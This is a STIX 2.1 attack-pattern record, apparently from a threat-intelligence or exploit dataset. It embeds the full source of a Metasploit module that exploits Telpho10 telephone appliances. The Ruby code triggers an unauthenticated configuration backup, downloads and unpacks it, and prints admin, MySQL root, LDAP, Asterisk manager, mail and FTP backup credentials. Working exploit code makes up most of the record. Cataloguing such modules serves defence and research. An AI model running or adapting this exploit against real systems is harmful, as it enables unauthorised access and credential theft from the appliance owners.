{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3e9da12f-d0cb-44c7-b175-7946641ec43a",
    "created": "2024-08-14T16:23:25.355883Z",
    "modified": "2024-08-14T16:23:25.355888Z",
    "name": "Telpho10 Backup Credentials Dumper",
    "description": " This module exploits a vulnerability present in all versions of Telpho10 telephone system appliance. This module generates a configuration backup of Telpho10 downloads the file and dumps the credentials for admin login phpmyadmin, phpldapadmin, etc. This module has been successfully tested on the appliance versions 2.6.31 and 2.6.39. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/telpho10_credential_dump.rb",
            "external_id": "telpho10_credential_dump.rb"
        },
        {
            "source_name": "References=>URL",
            "external_id": "https://github.com/whoot/TelpOWN"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Telpho10 Backup Credentials Dumper',\n        'Description' => %q{\n          This module exploits a vulnerability present in all versions of Telpho10 telephone system\n          appliance. This module generates a configuration backup of Telpho10,\n          downloads the file and dumps the credentials for admin login,\n          phpmyadmin, phpldapadmin, etc.\n          This module has been successfully tested on the appliance versions 2.6.31 and 2.6.39.\n        },\n        'Author' => 'Jan Rude', # Vulnerability Discovery and Metasploit Module\n        'License' => MSF_LICENSE,\n        'References' => ['URL', 'https://github.com/whoot/TelpOWN'],\n        'Platform' => 'linux',\n        'Privileged' => false,\n        'DisclosureDate' => '2016-09-02'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ]\n    )\n  end\n\n  # Used for unpacking backup files\n  def untar(tarfile)\n    destination = tarfile.split('.tar').first\n    FileUtils.mkdir_p(destination)\n    File.open(tarfile, 'rb') do |file|\n      Rex::Tar::Reader.new(file) do |tar|\n        tar.each do |entry|\n          dest = File.join(destination, File.basename(entry.full_name))\n          next unless entry.file?\n\n          File.open(dest, 'wb') do |f|\n            f.write(entry.read)\n          end\n          File.chmod(entry.header.mode, dest)\n        end\n      end\n    end\n    return destination\n  end\n\n  # search for credentials in backup file\n  def dump_creds(mysql_file)\n    file = File.new(mysql_file, 'r')\n    while (line = file.gets)\n      if line.include? 'adminusername'\n        config = [line]\n      end\n    end\n    file.close\n\n    print_status('Login (/telpho/login.php)')\n    print_status('-------------------------')\n    print_good(\"Username: #{config.first[/adminusername','(.*?)'/, 1]}\")\n    print_good(\"Password: #{config.first[/adminpassword','(.*?)'/, 1]}\\n\")\n\n    print_status('MySQL (/phpmyadmin)')\n    print_status('-------------------')\n    print_good('Username: root')\n    print_good(\"Password: #{config.first[/dbpassword','(.*?)'/, 1]}\\n\")\n\n    print_status('LDAP (/phpldapadmin)')\n    print_status('--------------------')\n    print_good('Username: cn=admin,dc=localdomain')\n    print_good(\"Password: #{config.first[/ldappassword','(.*?)'/, 1]}\\n\")\n\n    print_status('Asterisk MI (port 5038)')\n    print_status('-----------------------')\n    print_good(\"Username: #{config.first[/manageruser','(.*?)'/, 1]}\")\n    print_good(\"Password: #{config.first[/managersecret','(.*?)'/, 1]}\\n\")\n\n    print_status('Mail configuration')\n    print_status('------------------')\n    print_good(\"Mailserver: #{config.first[/ipsmarthost','(.*?)'/, 1]}\")\n    print_good(\"Username:   #{config.first[/mailusername','(.*?)'/, 1]}\")\n    print_good(\"Password:   #{config.first[/mailpassword','(.*?)'/, 1]}\")\n    print_good(\"Mail from:  #{config.first[/mailfrom','(.*?)'/, 1]}\\n\")\n\n    print_status('Online Backup')\n    print_status('-------------')\n    print_good(\"ID:       #{config.first[/ftpbackupid','(.*?)'/, 1]}\")\n    print_good(\"Password: #{config.first[/ftpbackuppw','(.*?)'/, 1]}\\n\")\n  end\n\n  def run\n    res = send_request_cgi({\n      'uri' => '/telpho/system/backup.php',\n      'method' => 'GET'\n    })\n    if res && res.code == 200\n      print_status('Generating backup')\n      sleep(1)\n    else\n      print_error('Could not find vulnerable script. Aborting.')\n      return nil\n    end\n\n    print_status('Downloading backup')\n    res = send_request_cgi({\n      'uri' => '/telpho/temp/telpho10.epb',\n      'method' => 'GET'\n    })\n    if res && res.code == 200\n      if res.body.to_s.bytesize == 0\n        print_error('0 bytes returned, file does not exist or is empty.')\n        return nil\n      end\n\n      path = store_loot(\n        'telpho10.backup',\n        'application/x-compressed',\n        datastore['RHOST'],\n        res.body,\n        'backup.tar'\n      )\n      print_good(\"File saved in: #{path}\")\n\n      begin\n        extracted = untar(path.to_s)\n        mysql = untar(\"#{extracted}/mysql.tar\")\n      rescue StandardError\n        print_error('Could not unpack files.')\n        return nil\n      end\n      begin\n        print_status(\"Dumping credentials\\n\")\n        dump_creds(\"#{mysql}/mysql.epb\")\n      rescue StandardError\n        print_error('Could not find credential file.')\n        return nil\n      end\n    else\n      print_error('Failed to download backup file.')\n      return nil\n    end\n  rescue ::Rex::ConnectionError\n    print_error(\"#{rhost}:#{rport} - Failed to connect\")\n    return nil\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-09-02",
    "x_mitre_platforms": [
        "linux'"
    ]
}